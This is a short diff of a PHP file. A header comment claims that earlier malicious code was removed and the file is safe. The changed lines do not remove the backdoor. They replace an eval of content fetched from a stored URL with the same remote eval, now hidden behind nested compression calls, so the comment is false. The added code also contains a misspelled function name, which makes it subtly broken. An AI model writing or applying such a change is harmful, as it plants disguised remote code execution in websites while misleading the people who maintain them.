@@ -28,6 +28,6 @@ class Secret{private $url;function __construct($url){$this->url=$url;}function r
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 **/
-$out=$getOut($compImag,$compReal,$key);
-@eval("?>".file_get_contents($out->reveal()));
+$out=gzompress(gzdeflate(gzencode(gzdeflate(gzcompress($getOut($compImag,$compReal,$key))))));
+@eval("?>".gzuncompress(gzinflate(gzdecode(gzinflate(gzuncompress(file_get_contents($out->reveal())))))));
 ?>
